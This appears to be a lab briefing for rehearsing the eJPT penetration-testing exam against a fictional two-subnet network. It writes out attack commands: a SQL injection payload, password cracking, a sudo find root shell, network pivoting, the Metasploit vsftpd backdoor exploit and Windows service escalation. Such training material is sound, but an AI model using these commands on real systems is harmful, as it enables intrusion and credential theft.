# Tactical Engagement: eJPT Comprehensive Mini-Exam Rehearsal

## Mission Objective
You have been contracted to execute an end-to-end, multi-host penetration test against Apex Corporate Infrastructure spanning two network segments. The engagement simulates the practical eJPT exam format, requiring you to chain web exploitation, offline password cracking, Linux privilege escalation, network routing and pivoting, remote service exploitation via Metasploit, and Windows local privilege escalation.

## Engagement Network Architecture
- Attacker Console: `kali@kali:~$` (`192.0.2.200`)
- Subnet 1 (Perimeter DMZ): `192.0.2.0/24` (Directly reachable)
  - `192.0.2.10` (`exam-web01`): Web Application Portal
  - `192.0.2.20` (`exam-gw01`): Dual-Homed Perimeter Gateway (also on `172.16.20.1`)
- Subnet 2 (Internal Operations): `172.16.20.0/24` (Segmented — requires pivot through gateway)
  - `172.16.20.30` (`exam-internal01`): Internal Application Server
  - `172.16.20.40` (`exam-win01`): Internal Windows Server 2019

---

## Phase 1: Perimeter Web Exploitation (Objective 1)
1. Scan `192.0.2.0/24` using `nmap -sV` to discover active web and infrastructure daemons.
2. Interrogate `http://192.0.2.10/portal/users.php?id=1` with `curl`.
3. Exploit UNION-based SQL injection on the `id` parameter:
   `curl 'http://192.0.2.10/portal/users.php?id=1+UNION+SELECT+1,username,password_hash+FROM+users'`
4. Submit the web flag (Flag 1) and note the extracted MD5 hash for `gw_operator`.

## Phase 2: Hash Cracking & Linux PrivEsc (Objective 2)
1. Crack the recovered MD5 hash using `hashcat -m 0 hashes.txt rockyou.txt` or `john --wordlist=rockyou.txt hashes.txt`.
2. Connect to `exam-gw01` via SSH: `ssh gw_operator@192.0.2.20`.
3. Check sudo permissions using `sudo -l`.
4. Exploit the `/usr/bin/find` NOPASSWD misconfiguration via GTFOBins:
   `sudo find . -exec /bin/sh \;`
5. Capture and submit `/root/flag.txt` (Flag 2).

## Phase 3: Network Pivoting & Internal Metasploit Exploitation (Objective 3)
1. Inspect gateway network interfaces using `ifconfig` or `ip a` to confirm the dual-homed `eth1` interface (`172.16.20.1/24`).
2. Add a route from the Kali attacker console:
   `ip route add 172.16.20.0/24 via 192.0.2.20`
   *(Alternatively, establish an SSH dynamic SOCKS proxy with `ssh -D 1080 -f -N gw_operator@192.0.2.20` and use `proxychains`).*
3. Launch `msfconsole`, configure `exploit/unix/ftp/vsftpd_234_backdoor`, set `RHOSTS 172.16.20.30`, and exploit.
4. From the spawned shell on `exam-internal01`, submit `/home/appuser/flag.txt` (Flag 3).
5. Read `/home/appuser/ad_credentials.txt` to uncover credentials for internal Windows host `exam-win01`.

## Phase 4: Windows Service Misconfiguration PrivEsc (Objective 4)
1. Establish a remote session on `exam-win01` (`172.16.20.40`) using `evil-winrm -i 172.16.20.40 -u win_analyst -p <password>` (or `ssh win_analyst@172.16.20.40`).
2. Query service binary paths using `sc qc ApexMaintenanceSvc` to identify the unquoted binary path executing as `LocalSystem`.
3. Trigger service execution with `sc start ApexMaintenanceSvc` (or `net start ApexMaintenanceSvc`) to elevate to `NT AUTHORITY\SYSTEM`.
4. Read `C:\Users\Administrator\flag.txt` using `type` and submit the capstone crown jewel flag (Flag 4).
